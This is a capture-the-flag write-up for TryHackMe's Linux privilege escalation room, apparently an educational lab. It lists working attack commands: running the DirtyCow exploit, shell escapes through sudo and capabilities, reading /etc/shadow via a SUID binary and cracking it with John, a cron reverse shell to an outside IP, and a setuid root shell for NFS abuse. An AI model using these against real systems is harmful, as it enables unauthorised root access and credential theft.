# Writeup to https://tryhackme.com/room/linprivesc

##Task 3: Enumeration


`set -g IP 10.10.110.229`

## Task 5: Kernel Exploits

```
set -gx IP 10.10.123.25
```

* Searched for possible exploits with linx-exploit-suggestor.sh
* Found DirtyCow Exploits [here](https://dirtycow.ninja/)
* Started simple http server with `python3 -m http.server 8888`
* Downloaded Dirtycow exploit with `wget $IP/cowroot.c`
* Compiled c script `gcc -pthread cowroot.c -o cowroot`
* Executed cowroot `./cowroot`

## Task 6: Sudo

```
set -gx IP 10.10.113.23
```

* Start a shell with sudo enabled nmap `sudo nmap --interactive`
* Found ways to create shell with commands [here](https://gtfobins.github.io/)


## Task 7: SUID

```
set -gx IP 10.10.72.7
```

* Searching for files with 's'-right `find / -type f -perm -04000 -ls 2>/dev/null`
* Compared list with gtfobins.github.io
* Found base64
* Read /home/ubuntu/flag3.txt
* Read /etc/passwd & downloaded
* Read /etc/shadow & downloaded
* Using `unshadow passwd shadow > passwords.txt`
* Using John to [crack](https://erev0s.com/blog/cracking-etcshadow-john/): `john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt`
* Found password of user2: **Password1**
* Found password of johnconway: **test123**

## Task 8: Capabilities

```
set -gx IP 10.10.89.75
```

* Search for Capabilities with `getcap -r / 2>/dev/null`
* Found 6 programs
* Using vim to start shell `./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'`


## Task 9: Cron Jobs

```
set -gx IP 10.10.100.247
```

* added following code to file mentioned in /etc/crontab
```
# /tmp/test.py

#!/bin/bash
bash -i >& /dev/tcp/10.8.60.141/8888 0>&1
```

* Started listener on local machine:
```bash
nc -nlvp 8888
```


## Task 10: PATH

```
set -gx IP 10.10.69.147
```

* searching for writable folders (and remove `proc` folder)

```bash
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

* echoing PATH
* modifiying PATH
* cd in `/home/murdoch`
* running `./test` instead of `test`

## Task 11: NFS

```
set -gx IP 10.10.85.67
```

* displaying mountable folders of server `showmount -e $IP`
* mounting folder `sudo mount $IP:/tmp /tmp/mountedfolder`
* creating C File on mounted folder `nfs.c`

```c
int main()
{
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0
}

```

* compiled as local root `sudo gcc nfs.c -o nfs`
* added suid flag `sudo +s nfs`
* added execution flag `sudo +x nfs`
* execute nfs as local user `/tmp/nfs`
* got sudo shell


## Task 12: Capstone Challenge

```
set -gx IP 10.10.116.121
```

* search for writable folder `find / -writeable 2>/dev/null` -> none found
* search for sudoable files `sudo -l` -> leonhard not in sudoers file
* searched for suid set binaries `find / -perm 04000 2>/dev/null` -> found base64 command
* downlaoded `/etc/passwd` and read `/etc/shadow` with

```
LFILE=/etc/shadow
base64 "${LFILE}" | base64 --decode
```

* copyied content in shadow
* unshadowed file with `unshadow passwd shadow > passwords.txt`
* using john the ripper to crack `john --wordlist=/usr/share/wordlists/rockyou.txt`
* found password and logged in as found user `su <username>`
* searched for sudoable files `sudo -l` -> found `find` command
* executed sudo shell with command found [here](https://gtfobins.github.io/gtfobins/find/)
